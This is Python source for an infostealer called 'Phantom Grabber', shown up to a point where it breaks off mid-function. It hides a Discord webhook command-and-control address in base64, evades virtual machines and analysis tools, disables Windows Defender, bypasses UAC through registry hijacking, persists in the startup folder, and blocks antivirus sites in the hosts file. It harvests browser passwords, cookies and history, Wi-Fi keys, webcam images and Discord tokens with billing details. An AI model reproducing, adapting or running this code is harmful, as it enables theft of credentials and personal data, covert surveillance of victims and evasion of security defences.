# pip install pyaesm urllib3

import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
from threading import Thread
from ctypes import wintypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()

class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEyNzMwMzI1ODk5MDQ1NzAyMy9ZeXd5QjFRRk5NbE5HX1FUQlRhckpzeUJkQjBjRnJHamhVZFAxTlI2RHRDUVhNTHlWVHhoU0YzOERMNm5XNVRlWFE5aA==').decode())
    Mutex = base64.b64decode('aDluS2ppdUNLd2lQRVl4Qw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('MTIzNA==').decode()
    HideConsole = bool('true')
    Debug = bool('')
    CaptureWebcam = bool('true')
    CapturePasswords = bool('true')
    CaptureCookies = bool('true')
    CaptureHistory = bool('true')
    CaptureDiscordTokens = bool('true')
    CaptureGames = bool('true')
    CaptureWifiPasswords = bool('true')
    CaptureSystemInfo = bool('true')
    CaptureScreenshot = bool('true')
    CaptureTelegram = bool('true')
    CaptureCommonFiles = bool('true')
    CaptureWallets = bool('true')
    FakeError = (bool(''), ('', '', '0'))
    BlockAvSites = bool('true')
    DiscordInjection = bool('true')
if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
for _, logger in logging.root.manager.loggerDict.items():
    logger.disabled = True
Logger = logging.getLogger('Phantom Grabber')
Logger.setLevel(logging.INFO)
if not Settings.Debug:
    Logger.disabled = True

class VmProtect:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '89DDD8A0-C66C-11EA-9A16-29F924D32D00', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkUUID() -> bool:
        Logger.info('Checking UUID')
        uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool:
        Logger.info('Checking computer name')
        computername = os.getenv('computername')
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool:
        Logger.info('Checking username')
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool:
        Logger.info('Checking if system is hosted online')
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
        except Exception:
            Logger.info('Unable to check if system is hosted online')
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool:
        Logger.info('Checking if system is simulating connection')
        http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
        try:
            http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool:
        Logger.info('Checking registry')
        r1 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
        r2 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
        gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode().splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None:
        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

    @staticmethod
    def isVM() -> bool:
        Logger.info('Checking if system is a VM')
        Thread(target=VmProtect.killTasks, daemon=True).start()
        result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
        if result:
            Logger.info('System is a VM')
        else:
            Logger.info('System is not a VM')
        return result

class Errors:
    errors: list[str] = []

    @staticmethod
    def Catch(func):

        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
                    if Utility.GetSelf()[1]:
                        Logger.error(trb)
        return newFunc

class Tasks:
    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()

class Syscalls:

    @staticmethod
    def CaptureWebcam(index: int, filePath: str) -> bool:
        avicap32 = ctypes.windll.avicap32
        WS_CHILD = 1073741824
        WM_CAP_DRIVER_CONNECT = 1024 + 10
        WM_CAP_DRIVER_DISCONNECT = 1026
        WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Blank'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                    result = True
                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            ctypes.windll.user32.DestroyWindow(hcam)
        return result

    @staticmethod
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183

    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str=None) -> bytes:

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode('utf-16')
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError('Invalid encrypted_data provided!')

    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
                name = name[:-4] if name.endswith('.exe') else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

    @staticmethod
    def DisableDefender() -> None:
        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def ExcludeFromDefender(path: str=None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def GetRandomString(length: int=5, invisible: bool=False):
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[line.find(':') + 1:].strip()
                profiles.append(name)
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[line.find(':') + 1:].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def Tree(path: str | tuple, prefix: str='', base_has_files: bool=False):

        def GetSize(_path: str) -> int:
            size = 0
            if os.path.isfile(_path):
                size += os.path.getsize(_path)
            elif os.path.isdir(_path):
                for root, dirs, files in os.walk(_path):
                    for file in files:
                        size += os.path.getsize(os.path.join(root, file))
                    for _dir in dirs:
                        size += GetSize(os.path.join(root, _dir))
            return size
        DIRICON = chr(128194) + ' - '
        FILEICON = chr(128196) + ' - '
        EMPTY = '    '
        PIPE = chr(9474) + '   '
        TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
        ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
        if prefix == '':
            if isinstance(path, str):
                yield (DIRICON + os.path.basename(os.path.abspath(path)))
            elif isinstance(path, tuple):
                yield (DIRICON + path[1])
                path = path[0]
        contents = os.listdir(path)
        folders = (os.path.join(path, x) for x in contents if os.path.isdir(os.path.join(path, x)))
        files = (os.path.join(path, x) for x in contents if os.path.isfile(os.path.join(path, x)))
        body = [TEE for _ in range(len(contents) - 1)] + [ELBOW]
        count = 0
        for item in folders:
            yield (prefix + body[count] + DIRICON + os.path.basename(item) + ' (%d items, %.2f KB)' % (len(os.listdir(item)), GetSize(item) / 1024))
            yield from Utility.Tree(item, prefix + (EMPTY if count == len(body) - 1 else PIPE) if prefix else PIPE if count == 0 or base_has_files else EMPTY, files and (not prefix))
            count += 1
        for item in files:
            yield (prefix + body[count] + FILEICON + os.path.basename(item) + ' (%.2f KB)' % (GetSize(item) / 1024))
            count += 1

    @staticmethod
    def IsAdmin() -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    @staticmethod
    def UACbypass(method: int=1) -> None:
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True).returncode == 0
            if method == 1:
                if not execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f'):
                    Utility.UACbypass(2)
                if not execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f'):
                    Utility.UACbypass(2)
                execute('computerdefaults --nouacbypass')
                execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
            elif method == 2:
                execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                execute('fodhelper --nouacbypass')
                execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
            os._exit(0)

    @staticmethod
    def IsInStartup() -> bool:
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == 'startup'

    @staticmethod
    def PutInStartup() -> str:
        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
        file, isExecutable = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, '{}.scr'.format(Utility.GetRandomString(invisible=True)))
            os.makedirs(STARTUPDIR, exist_ok=True)
            try:
                shutil.copy(file, out)
            except Exception:
                return None
            return out

    @staticmethod
    def IsConnectedToInternet() -> bool:
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except Exception:
            return False

    @staticmethod
    def DeleteSelf():
        path, isExecutable = Utility.GetSelf()
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)

    @staticmethod
    def HideSelf() -> None:
        path, _ = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites() -> None:
        if Utility.IsAdmin():
            call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
            if call.returncode != 0:
                hostdirpath = os.path.join('System32', 'drivers', 'etc')
            else:
                hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
            hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
            if not os.path.isfile(hostfilepath):
                return
            with open(hostfilepath) as file:
                data = file.readlines()
            BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
            newdata = []
            for i in data:
                if any([x in i for x in BANNED_SITES]):
                    continue
                else:
                    newdata.append(i)
            for i in BANNED_SITES:
                newdata.append('\t0.0.0.0 {}'.format(i))
                newdata.append('\t0.0.0.0 www.{}'.format(i))
            newdata = '\n'.join(newdata).replace('\n\n', '\n')
            subprocess.run('attrib -r {}'.format(hostfilepath), shell=True, capture_output=True)
            with open(hostfilepath, 'w') as file:
                file.write(newdata)
            subprocess.run('attrib +r {}'.format(hostfilepath), shell=True, capture_output=True)

class Browsers:

    class Chromium:
        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError('Browser path not found!')
            self.BrowserPath = browserPath

        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            else:
                localStatePath = os.path.join(self.BrowserPath, 'Local State')
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                        jsonContent: dict = json.load(file)
                    encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey
                else:
                    return None

        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            version = buffer.decode(errors='ignore')
            if version.startswith(('v10', 'v11')):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode()
            else:
                return str(Syscalls.CryptUnprotectData(buffer))

        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()
            if encryptionKey is None:
                return passwords
            loginFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'login data':
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)
                        if url and username and password:
                            passwords.append((url, username, password))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return passwords

        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()
            if encryptionKey is None:
                return cookies
            cookiesFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'cookies':
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)
                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return cookies

        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()
            historyFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    for url, title, vc, lvt in results:
                        if url and title and (vc is not None) and (lvt is not None):
                            history.append((url, title, vc, lvt))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            history.sort(key=lambda x: x[3], reverse=True)
            return list([(x[0], x[1], x[2]) for x in history])

class Discord:
    httpClient = PoolManager(cert_reqs='CERT_NONE')
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

    @staticmethod
    def GetHeaders(token: str=None) -> dict:
        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
        if token:
            headers['authorization'] = token
        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()
        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
        for name, path in paths.items():
            if os.path.isdir(path):
                if name == 'FireFox':
                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)
                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        for thread in threads:
            thread.join()
        tokens = [*set(tokens)]
        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode()
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified = r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode())
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)
                        if method_type == 0:
                            methods['Unknown'] += 1
                        elif method_type == 1:
                            methods['Card'] += 1
                        else:
                            methods['Paypal'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode()
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone, 'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()
        localStatePath = os.path.join(path, 'Local State')
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors='ignore') as file:
                jsonContent: dict = json.load(file)
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
